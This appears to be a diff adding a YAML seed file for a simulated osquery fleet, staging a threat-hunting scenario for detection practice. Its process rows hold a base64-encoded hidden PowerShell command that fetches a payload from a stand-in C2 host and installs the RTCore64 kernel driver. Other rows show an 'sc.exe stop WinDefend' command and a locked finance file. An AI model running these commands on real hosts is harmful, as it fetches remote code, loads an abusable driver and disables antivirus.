@@ -1,0 +1,984 @@
+# Example Corp Windows hosts: dc-01, file-srv-01, finance-ws-12/13, hr-ws-03,
+# sales-ws-21. Layered over the built-in windows profile (--seeds-dir).
+#
+# Rows with `_hosts` are reported only by the hosts named there. Times use
+# {{ago:DURATION}}: story events keep the same age relative to query time, so
+# the scenario always looks recent no matter when the fleet was started.
+#
+# S1 "Driver in the finance wing" on finance-ws-12 (a.harper):
+#   Invoice_0921.zip -> Invoice_0921.lnk -> powershell -enc (download a.bin from
+#   update.example-c2.test to %TEMP%\rtc.sys) -> RTCore64 kernel driver service
+#   (MSI Afterburner, LOLDrivers) -> WinDefend / Sense / WdNisSvc stopped ->
+#   SMB logon to file-srv-01 -> blocked bulk rename of \\file-srv-01\finance.
+
+processes:
+  - _hosts: finance-ws-12
+    pid: "4312"
+    parent: "4288"
+    name: explorer.exe
+    path: C:\Windows\explorer.exe
+    cmdline: C:\Windows\Explorer.EXE
+    cwd: C:\Windows\system32\
+    state: STILL_ACTIVE
+    uid: "1105"
+    start_time: "{{ago:31h12m}}"
+  - _hosts: finance-ws-12
+    pid: "7788"
+    parent: "4312"
+    name: powershell.exe
+    path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmdline: powershell.exe -NoP -W Hidden -Enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALQBjADIALgB0AGUAcwB0AC8AYQAuAGIAaQBuACcALAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcgB0AGMALgBzAHkAcwAiACkAOwAgAHMAYwAuAGUAeABlACAAYwByAGUAYQB0AGUAIABSAFQAQwBvAHIAZQA2ADQAIAB0AHkAcABlAD0AIABrAGUAcgBuAGUAbAAgAGIAaQBuAFAAYQB0AGgAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXAByAHQAYwAuAHMAeQBzACIAOwAgAHMAYwAuAGUAeABlACAAcwB0AGEAcgB0ACAAUgBUAEMAbwByAGUANgA0AA==
+    cwd: C:\Users\a.harper\Downloads\Invoice_0921\
+    state: STILL_ACTIVE
+    uid: "1105"
+    start_time: "{{ago:26h10m}}"
+  - _hosts: file-srv-01
+    pid: "4"
+    parent: "0"
+    name: System
+    path: ""
+    cmdline: ""
+    state: STILL_ACTIVE
+    uid: "0"
+  - _hosts: dc-01
+    pid: "712"
+    parent: "596"
+    name: lsass.exe
+    path: C:\Windows\System32\lsass.exe
+    cmdline: C:\Windows\system32\lsass.exe
+    state: STILL_ACTIVE
+    uid: "18"
+
+# Process launches (historical). Not a native Windows osquery table; seeded so the
+# cross-platform process_events queries answer on these hosts.
+process_events:
+  - _hosts: finance-ws-12
+    time: "{{ago:26h10m}}"
+    pid: "7788"
+    parent: "4312"
+    path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmdline: powershell.exe -NoP -W Hidden -Enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALQBjADIALgB0AGUAcwB0AC8AYQAuAGIAaQBuACcALAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcgB0AGMALgBzAHkAcwAiACkAOwAgAHMAYwAuAGUAeABlACAAYwByAGUAYQB0AGUAIABSAFQAQwBvAHIAZQA2ADQAIAB0AHkAcABlAD0AIABrAGUAcgBuAGUAbAAgAGIAaQBuAFAAYQB0AGgAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXAByAHQAYwAuAHMAeQBzACIAOwAgAHMAYwAuAGUAeABlACAAcwB0AGEAcgB0ACAAUgBUAEMAbwByAGUANgA0AA==
+    cwd: C:\Users\a.harper\Downloads\Invoice_0921\
+    uid: "1105"
+  - _hosts: finance-ws-12
+    time: "{{ago:26h05m}}"
+    pid: "8016"
+    parent: "7788"
+    path: C:\Windows\System32\sc.exe
+    cmdline: sc.exe create RTCore64 type= kernel binPath= "C:\Users\a.harper\AppData\Local\Temp\rtc.sys"
+    cwd: C:\Users\a.harper\Downloads\Invoice_0921\
+    uid: "1105"
+  - _hosts: finance-ws-12
+    time: "{{ago:26h04m}}"
+    pid: "8044"
+    parent: "7788"
+    path: C:\Windows\System32\sc.exe
+    cmdline: sc.exe stop WinDefend
+    cwd: C:\Users\a.harper\Downloads\Invoice_0921\
+    uid: "1105"
+
+file:
+  - _hosts: finance-ws-12
+    path: C:\Users\a.harper\Downloads\Invoice_0921.zip
+    directory: C:\Users\a.harper\Downloads
+    filename: Invoice_0921.zip
+    size: "2291"
+    type: regular
+    btime: "{{ago:27h}}"
+    mtime: "{{ago:27h}}"
+  - _hosts: finance-ws-12
+    path: C:\Users\a.harper\Downloads\Invoice_0921\Invoice_0921.lnk
+    directory: C:\Users\a.harper\Downloads\Invoice_0921
+    filename: Invoice_0921.lnk
+    size: "1874"
+    type: regular
+    btime: "{{ago:26h11m}}"
+    mtime: "{{ago:26h11m}}"
+  - _hosts: finance-ws-12
+    path: C:\Users\a.harper\AppData\Local\Temp\rtc.sys
+    directory: C:\Users\a.harper\AppData\Local\Temp
+    filename: rtc.sys
+    size: "14024"
+    type: regular
+    btime: "{{ago:26h08m}}"
+    mtime: "{{ago:26h08m}}"
+  - _hosts: file-srv-01
+    path: D:\Shares\finance\Vendor_Payments_Sep.xlsx.locked
+    directory: D:\Shares\finance
+    filename: Vendor_Payments_Sep.xlsx.locked
+    size: "48213"
+    type: regular
+    mtime: "{{ago:25h}}"
+  - _hosts: file-srv-01
+    path: D:\Shares\finance\AP_Aging_Q3.xlsx
+    directory: D:\Shares\finance
+    filename: AP_Aging_Q3.xlsx
+    size: "91877"
+    type: regular
+    mtime: "{{ago:216h}}"
+
+hash:
+  - _hosts: finance-ws-12
+    path: C:\Users\a.harper\AppData\Local\Temp\rtc.sys
+    directory: C:\Users\a.harper\AppData\Local\Temp
+    md5: 2d8e4f38b36c334d0a32a7324832501d
+    sha1: f6f11ad2cd2b0cf95ed42324876bee1d83e01775
+    sha256: 01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd
+
+drivers:
+  - _hosts: finance-ws-12
+    device_id: ROOT\LEGACY_RTCORE64\0000
+    device_name: RTCore64
+    image: C:\Users\a.harper\AppData\Local\Temp\rtc.sys
+    description: RTCore64
+    service: RTCore64
+    service_key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RTCore64
+    version: "4.6.2.15658"
+    provider: Micro-Star Int'l Co., Ltd.
+    manufacturer: Micro-Star Int'l Co., Ltd.
+    class: LegacyDriver
+    date: "{{ago:26h05m}}"
+    signed: "1"
+
+services:
+  - _hosts: finance-ws-12
+    name: RTCore64
+    display_name: RTCore64
+    service_type: KERNEL_DRIVER
+    status: RUNNING
+    start_type: DEMAND_START
+    path: \??\C:\Users\a.harper\AppData\Local\Temp\rtc.sys
+    module_path: ""
+    user_account: ""
+    description: ""
+  - _hosts: finance-ws-12
+    _key: name
+    name: WinDefend
+    display_name: Microsoft Defender Antivirus Service
+    service_type: OWN_PROCESS
+    status: STOPPED
+    pid: "0"
+    start_type: AUTO_START
+    path: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24080.9-0\MsMpEng.exe"'
+    user_account: LocalSystem
+  - _hosts: finance-ws-12
+    name: Sense
+    display_name: Windows Defender Advanced Threat Protection Service
+    service_type: OWN_PROCESS
+    status: STOPPED
+    pid: "0"
+    start_type: DEMAND_START
+    path: '"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"'
+    user_account: LocalSystem
+  - _hosts: finance-ws-12
+    name: WdNisSvc
+    display_name: Microsoft Defender Antivirus Network Inspection Service
+    service_type: OWN_PROCESS
+    status: STOPPED
+    pid: "0"
+    start_type: DEMAND_START
+    path: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24080.9-0\NisSrv.exe"'
+    user_account: NT AUTHORITY\LocalService
+  - _hosts: finance-ws-13|hr-ws-03|sales-ws-21|dc-01|file-srv-01
+    _key: name
+    name: WinDefend
+    display_name: Microsoft Defender Antivirus Service
+    service_type: OWN_PROCESS
+    status: RUNNING
+    pid: "3140"
+    start_type: AUTO_START
+    path: '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24080.9-0\MsMpEng.exe"'
+    user_account: LocalSystem
+  - _hosts: finance-ws-12|finance-ws-13|hr-ws-03|sales-ws-21|dc-01|file-srv-01
+    name: CSFalconService
+    display_name: CrowdStrike Falcon Sensor Service
+    service_type: OWN_PROCESS
+    status: RUNNING
+    pid: "2716"
+    start_type: AUTO_START
+    path: '"C:\Program Files\CrowdStrike\CSFalconService.exe"'
+    user_account: LocalSystem
+
+socket_events:
+  - _hosts: finance-ws-12
+    time: "{{ago:26h08m}}"
+    action: connect
+    pid: "7788"
+    path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    family: "2"
+    protocol: "6"
+    local_address: 10.14.40.112
+    local_port: "51544"
+    remote_address: 203.0.113.42
+    remote_port: "443"
+    success: "1"
+  - _hosts: finance-ws-12
+    time: "{{ago:25h30m}}"
+    action: connect
+    pid: "4"
+    path: System
+    family: "2"
+    protocol: "6"
+    local_address: 10.14.40.112
+    local_port: "51602"
+    remote_address: 10.14.5.40
+    remote_port: "445"
+    success: "1"
+
+listening_ports:
+  - _hosts: dc-01
+    pid: "712"
+    port: "88"
+    protocol: "6"
+    family: "2"
+    address: 0.0.0.0
+    path: C:\Windows\System32\lsass.exe
+  - _hosts: dc-01
+    pid: "712"
+    port: "389"
+    protocol: "6"
+    family: "2"
+    address: 0.0.0.0
+    path: C:\Windows\System32\lsass.exe
+  - _hosts: dc-01
+    pid: "712"
+    port: "636"
+    protocol: "6"
+    family: "2"
+    address: 0.0.0.0
+    path: C:\Windows\System32\lsass.exe
+  - _hosts: dc-01|file-srv-01
+    pid: "4"
+    port: "445"
+    protocol: "6"
+    family: "2"
+    address: 0.0.0.0
+    path: System
+  - _hosts: dc-01
+    pid: "2032"
+    port: "53"
+    protocol: "17"
+    family: "2"
+    address: 0.0.0.0
+    path: C:\Windows\System32\dns.exe
+
+programs:
+  - _hosts: finance-ws-12|finance-ws-13|hr-ws-03|sales-ws-21|dc-01|file-srv-01
+    name: CrowdStrike Windows Sensor
+    version: "7.16.18637.0"
+    publisher: CrowdStrike, Inc.
+    install_location: C:\Program Files\CrowdStrike\
+  - _hosts: sales-ws-21
+    name: Search Toolbar Plus
+    version: "3.2.1.0"
+    publisher: Toolbar Media Ltd
+    install_location: C:\Program Files (x86)\SearchToolbarPlus\
+  - _hosts: finance-ws-12|finance-ws-13
+    name: Microsoft 365 Apps for enterprise - en-us
+    version: "16.0.17928.20156"
+    publisher: Microsoft Corporation
+
+# ---- Identity & inventory (generated from nodes.yaml; keep in step) ----
+# Tables listed in _replace drop the built-in profile rows: these hosts
+# report exactly what is written here (see the "Seeds" section of the top-level README.md).
+_replace: [users, groups, user_groups, logged_in_users, interface_addresses, usb_devices, chrome_extensions, platform_info, last, patches]
+chrome_extensions:
+- _hosts: finance-ws-12
+  browser_type: chrome
+  uid: "1105"
+  name: Google Docs Offline
+  profile: Person 1
+  identifier: ghbmnnjooekpmoecnnnilnnbdlolhkhi
+  version: "1.83.1"
+  default_locale: en
+  author: Google
+  persistent: "0"
+  path: "C:\\Users\\a.harper\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\1.83.1_0"
+  permissions: alarms,storage,unlimitedStorage
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: finance-ws-12
+  browser_type: chrome
+  uid: "1105"
+  name: 1Password – Password Manager
+  profile: Person 1
+  identifier: aeblfdkhhhdcdjpifhhbdiojplfjncoa
+  version: "8.10.46"
+  default_locale: en
+  author: AgileBits
+  persistent: "0"
+  path: "C:\\Users\\a.harper\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\aeblfdkhhhdcdjpifhhbdiojplfjncoa\\8.10.46_0"
+  permissions: activeTab,alarms,contextMenus,idle,nativeMessaging,notifications,privacy,scripting,storage,tabs,webNavigation,webRequest,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: finance-ws-12
+  browser_type: chrome
+  uid: "1105"
+  name: Windows Accounts
+  profile: Person 1
+  identifier: ppnbnpeolgkicgegkbkbjmhlideopiji
+  version: "1.0.8"
+  default_locale: en
+  author: Microsoft
+  persistent: "0"
+  path: "C:\\Users\\a.harper\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ppnbnpeolgkicgegkbkbjmhlideopiji\\1.0.8_0"
+  permissions: nativeMessaging,webRequest,webRequestBlocking,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: finance-ws-13
+  browser_type: chrome
+  uid: "1106"
+  name: Google Docs Offline
+  profile: Person 1
+  identifier: ghbmnnjooekpmoecnnnilnnbdlolhkhi
+  version: "1.83.1"
+  default_locale: en
+  author: Google
+  persistent: "0"
+  path: "C:\\Users\\s.novak\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\1.83.1_0"
+  permissions: alarms,storage,unlimitedStorage
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: finance-ws-13
+  browser_type: chrome
+  uid: "1106"
+  name: 1Password – Password Manager
+  profile: Person 1
+  identifier: aeblfdkhhhdcdjpifhhbdiojplfjncoa
+  version: "8.10.46"
+  default_locale: en
+  author: AgileBits
+  persistent: "0"
+  path: "C:\\Users\\s.novak\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\aeblfdkhhhdcdjpifhhbdiojplfjncoa\\8.10.46_0"
+  permissions: activeTab,alarms,contextMenus,idle,nativeMessaging,notifications,privacy,scripting,storage,tabs,webNavigation,webRequest,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: finance-ws-13
+  browser_type: chrome
+  uid: "1106"
+  name: Windows Accounts
+  profile: Person 1
+  identifier: ppnbnpeolgkicgegkbkbjmhlideopiji
+  version: "1.0.8"
+  default_locale: en
+  author: Microsoft
+  persistent: "0"
+  path: "C:\\Users\\s.novak\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ppnbnpeolgkicgegkbkbjmhlideopiji\\1.0.8_0"
+  permissions: nativeMessaging,webRequest,webRequestBlocking,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: hr-ws-03
+  browser_type: chrome
+  uid: "1108"
+  name: Google Docs Offline
+  profile: Person 1
+  identifier: ghbmnnjooekpmoecnnnilnnbdlolhkhi
+  version: "1.83.1"
+  default_locale: en
+  author: Google
+  persistent: "0"
+  path: "C:\\Users\\j.chen\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\1.83.1_0"
+  permissions: alarms,storage,unlimitedStorage
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: hr-ws-03
+  browser_type: chrome
+  uid: "1108"
+  name: 1Password – Password Manager
+  profile: Person 1
+  identifier: aeblfdkhhhdcdjpifhhbdiojplfjncoa
+  version: "8.10.46"
+  default_locale: en
+  author: AgileBits
+  persistent: "0"
+  path: "C:\\Users\\j.chen\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\aeblfdkhhhdcdjpifhhbdiojplfjncoa\\8.10.46_0"
+  permissions: activeTab,alarms,contextMenus,idle,nativeMessaging,notifications,privacy,scripting,storage,tabs,webNavigation,webRequest,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: hr-ws-03
+  browser_type: chrome
+  uid: "1108"
+  name: Windows Accounts
+  profile: Person 1
+  identifier: ppnbnpeolgkicgegkbkbjmhlideopiji
+  version: "1.0.8"
+  default_locale: en
+  author: Microsoft
+  persistent: "0"
+  path: "C:\\Users\\j.chen\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ppnbnpeolgkicgegkbkbjmhlideopiji\\1.0.8_0"
+  permissions: nativeMessaging,webRequest,webRequestBlocking,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: hr-ws-03
+  browser_type: chrome
+  uid: "1108"
+  name: "Grammarly: AI Writing and Grammar Checker App"
+  profile: Person 1
+  identifier: kbfnbcaeplbcioakkpcpgfkobkghlhen
+  version: "14.1196.0"
+  default_locale: en
+  author: Grammarly
+  persistent: "0"
+  path: "C:\\Users\\j.chen\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\kbfnbcaeplbcioakkpcpgfkobkghlhen\\14.1196.0_0"
+  permissions: storage,tabs,scripting,notifications,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: sales-ws-21
+  browser_type: chrome
+  uid: "1109"
+  name: Google Docs Offline
+  profile: Person 1
+  identifier: ghbmnnjooekpmoecnnnilnnbdlolhkhi
+  version: "1.83.1"
+  default_locale: en
+  author: Google
+  persistent: "0"
+  path: "C:\\Users\\p.ivanova\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\1.83.1_0"
+  permissions: alarms,storage,unlimitedStorage
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: sales-ws-21
+  browser_type: chrome
+  uid: "1109"
+  name: 1Password – Password Manager
+  profile: Person 1
+  identifier: aeblfdkhhhdcdjpifhhbdiojplfjncoa
+  version: "8.10.46"
+  default_locale: en
+  author: AgileBits
+  persistent: "0"
+  path: "C:\\Users\\p.ivanova\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\aeblfdkhhhdcdjpifhhbdiojplfjncoa\\8.10.46_0"
+  permissions: activeTab,alarms,contextMenus,idle,nativeMessaging,notifications,privacy,scripting,storage,tabs,webNavigation,webRequest,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: sales-ws-21
+  browser_type: chrome
+  uid: "1109"
+  name: Windows Accounts
+  profile: Person 1
+  identifier: ppnbnpeolgkicgegkbkbjmhlideopiji
+  version: "1.0.8"
+  default_locale: en
+  author: Microsoft
+  persistent: "0"
+  path: "C:\\Users\\p.ivanova\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\ppnbnpeolgkicgegkbkbjmhlideopiji\\1.0.8_0"
+  permissions: nativeMessaging,webRequest,webRequestBlocking,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+- _hosts: sales-ws-21
+  browser_type: chrome
+  uid: "1109"
+  name: "Grammarly: AI Writing and Grammar Checker App"
+  profile: Person 1
+  identifier: kbfnbcaeplbcioakkpcpgfkobkghlhen
+  version: "14.1196.0"
+  default_locale: en
+  author: Grammarly
+  persistent: "0"
+  path: "C:\\Users\\p.ivanova\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\kbfnbcaeplbcioakkpcpgfkobkghlhen\\14.1196.0_0"
+  permissions: storage,tabs,scripting,notifications,<all_urls>
+  update_url: "https://clients2.google.com/service/update2/crx"
+  from_webstore: "true"
+  state: "1"
+  referenced: "1"
+groups:
+- gid: "544"
+  gid_signed: "544"
+  groupname: Administrators
+  group_sid: S-1-5-32-544
+  comment: Administrators have complete and unrestricted access to the computer/domain
+- gid: "545"
+  gid_signed: "545"
+  groupname: Users
+  group_sid: S-1-5-32-545
+  comment: Users are prevented from making accidental or intentional system-wide changes
+- gid: "546"
+  gid_signed: "546"
+  groupname: Guests
+  group_sid: S-1-5-32-546
+  comment: Guests have the same access as members of the Users group by default
+- gid: "555"
+  gid_signed: "555"
+  groupname: Remote Desktop Users
+  group_sid: S-1-5-32-555
+  comment: Members in this group are granted the right to logon remotely
+interface_addresses:
+- interface: Loopback Pseudo-Interface 1
+  address: "127.0.0.1"
+  mask: "255.0.0.0"
+  broadcast: ""
+  point_to_point: ""
+  type: manual
+- _hosts: dc-01
+  interface: Ethernet
+  address: "10.14.5.10"
+  mask: "255.255.255.0"
+  broadcast: "10.14.5.255"
+  point_to_point: ""
+  type: manual
+- _hosts: file-srv-01
+  interface: Ethernet
+  address: "10.14.5.40"
+  mask: "255.255.255.0"
+  broadcast: "10.14.5.255"
+  point_to_point: ""
+  type: manual
+- _hosts: finance-ws-12
+  interface: Ethernet
+  address: "10.14.40.112"
+  mask: "255.255.255.0"
+  broadcast: "10.14.40.255"
+  point_to_point: ""
+  type: dhcp
+- _hosts: finance-ws-13
+  interface: Ethernet
+  address: "10.14.40.113"
+  mask: "255.255.255.0"
+  broadcast: "10.14.40.255"
+  point_to_point: ""
+  type: dhcp
+- _hosts: hr-ws-03
+  interface: Ethernet
+  address: "10.14.42.103"
+  mask: "255.255.255.0"
+  broadcast: "10.14.42.255"
+  point_to_point: ""
+  type: dhcp
+- _hosts: sales-ws-21
+  interface: Ethernet
+  address: "10.14.43.121"
+  mask: "255.255.255.0"
+  broadcast: "10.14.43.255"
+  point_to_point: ""
+  type: dhcp
+last: []
+logged_in_users:
+- _hosts: finance-ws-12
+  type: active
+  user: a.harper
+  tty: console
+  host: ""
+  time: "{{ago:31h12m}}"
+  pid: "4312"
+- _hosts: finance-ws-13
+  type: active
+  user: s.novak
+  tty: console
+  host: ""
+  time: "{{ago:3h40m}}"
+  pid: "5120"
+- _hosts: hr-ws-03
+  type: active
+  user: j.chen
+  tty: console
+  host: ""
+  time: "{{ago:3h40m}}"
+  pid: "5120"
+- _hosts: sales-ws-21
+  type: active
+  user: p.ivanova
+  tty: console
+  host: ""
+  time: "{{ago:3h40m}}"
+  pid: "5120"
+patches:
+- _hosts: dc-01
+  csname: DC-01
+  hotfix_id: KB5042881
+  caption: "https://support.microsoft.com/help/5042881"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 9/11/2024
+  installed_on: 9/11/2024
+- _hosts: dc-01
+  csname: DC-01
+  hotfix_id: KB5041160
+  caption: "https://support.microsoft.com/help/5041160"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: file-srv-01
+  csname: FILE-SRV-01
+  hotfix_id: KB5042881
+  caption: "https://support.microsoft.com/help/5042881"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 9/11/2024
+  installed_on: 9/11/2024
+- _hosts: file-srv-01
+  csname: FILE-SRV-01
+  hotfix_id: KB5041160
+  caption: "https://support.microsoft.com/help/5041160"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: finance-ws-12
+  csname: FINANCE-WS-12
+  hotfix_id: KB5043076
+  caption: "https://support.microsoft.com/help/5043076"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 9/11/2024
+  installed_on: 9/11/2024
+- _hosts: finance-ws-12
+  csname: FINANCE-WS-12
+  hotfix_id: KB5041585
+  caption: "https://support.microsoft.com/help/5041585"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: finance-ws-12
+  csname: FINANCE-WS-12
+  hotfix_id: KB5042099
+  caption: "https://support.microsoft.com/help/5042099"
+  description: Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: finance-ws-13
+  csname: FINANCE-WS-13
+  hotfix_id: KB5043076
+  caption: "https://support.microsoft.com/help/5043076"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 9/11/2024
+  installed_on: 9/11/2024
+- _hosts: finance-ws-13
+  csname: FINANCE-WS-13
+  hotfix_id: KB5041585
+  caption: "https://support.microsoft.com/help/5041585"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: finance-ws-13
+  csname: FINANCE-WS-13
+  hotfix_id: KB5042099
+  caption: "https://support.microsoft.com/help/5042099"
+  description: Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: hr-ws-03
+  csname: HR-WS-03
+  hotfix_id: KB5043076
+  caption: "https://support.microsoft.com/help/5043076"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 9/11/2024
+  installed_on: 9/11/2024
+- _hosts: hr-ws-03
+  csname: HR-WS-03
+  hotfix_id: KB5041585
+  caption: "https://support.microsoft.com/help/5041585"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: hr-ws-03
+  csname: HR-WS-03
+  hotfix_id: KB5042099
+  caption: "https://support.microsoft.com/help/5042099"
+  description: Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: sales-ws-21
+  csname: SALES-WS-21
+  hotfix_id: KB5043076
+  caption: "https://support.microsoft.com/help/5043076"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 9/11/2024
+  installed_on: 9/11/2024
+- _hosts: sales-ws-21
+  csname: SALES-WS-21
+  hotfix_id: KB5041585
+  caption: "https://support.microsoft.com/help/5041585"
+  description: Security Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+- _hosts: sales-ws-21
+  csname: SALES-WS-21
+  hotfix_id: KB5042099
+  caption: "https://support.microsoft.com/help/5042099"
+  description: Update
+  fix_comments: ""
+  installed_by: NT AUTHORITY\SYSTEM
+  install_date: 8/14/2024
+  installed_on: 8/14/2024
+platform_info:
+- _hosts: dc-01
+  vendor: VMware, Inc.
+  version: VMW71.00V.21100432.B64.2301110304
+  date: 01/11/2023
+  revision: ""
+  extra: ""
+  firmware_type: uefi
+  address: ""
+  size: ""
+  volume_size: ""
+- _hosts: file-srv-01
+  vendor: VMware, Inc.
+  version: VMW71.00V.21100432.B64.2301110304
+  date: 01/11/2023
+  revision: ""
+  extra: ""
+  firmware_type: uefi
+  address: ""
+  size: ""
+  volume_size: ""
+- _hosts: finance-ws-12
+  vendor: Dell Inc.
+  version: "1.18.0"
+  date: 07/10/2024
+  revision: ""
+  extra: ""
+  firmware_type: uefi
+  address: ""
+  size: ""
+  volume_size: ""
+- _hosts: finance-ws-13
+  vendor: Dell Inc.
+  version: "1.18.0"
+  date: 07/10/2024
+  revision: ""
+  extra: ""
+  firmware_type: uefi
+  address: ""
+  size: ""
+  volume_size: ""
+- _hosts: hr-ws-03
+  vendor: LENOVO
+  version: R2FET56W (1.36 )
+  date: 06/20/2024
+  revision: ""
+  extra: ""
+  firmware_type: uefi
+  address: ""
+  size: ""
+  volume_size: ""
+- _hosts: sales-ws-21
+  vendor: HP
+  version: V70 Ver. 01.06.01
+  date: 04/15/2024
+  revision: ""
+  extra: ""
+  firmware_type: uefi
+  address: ""
+  size: ""
+  volume_size: ""
+usb_devices:
+- _hosts: finance-ws-12
+  usb_address: "3"
+  usb_port: "2"
+  vendor: Logitech, Inc.
+  vendor_id: 046d
+  version: "12.11"
+  model: Unifying Receiver
+  model_id: c52b
+  serial: ""
+  class: "3"
+  subclass: "1"
+  protocol: "2"
+  removable: "1"
+- _hosts: finance-ws-12
+  usb_address: "5"
+  usb_port: "4"
+  vendor: Yubico
+  vendor_id: "1050"
+  version: "5.43"
+  model: YubiKey OTP+FIDO+CCID
+  model_id: "0407"
+  serial: ""
+  class: "0"
+  subclass: "0"
+  protocol: "0"
+  removable: "1"
+- _hosts: finance-ws-13
+  usb_address: "3"
+  usb_port: "2"
+  vendor: Logitech, Inc.
+  vendor_id: 046d
+  version: "12.11"
+  model: Unifying Receiver
+  model_id: c52b
+  serial: ""
+  class: "3"
+  subclass: "1"
+  protocol: "2"
+  removable: "1"
+- _hosts: finance-ws-13
+  usb_address: "5"
+  usb_port: "4"
+  vendor: Yubico
+  vendor_id: "1050"
+  version: "5.43"
+  model: YubiKey OTP+FIDO+CCID
+  model_id: "0407"
+  serial: ""
+  class: "0"
+  subclass: "0"
+  protocol: "0"
+  removable: "1"
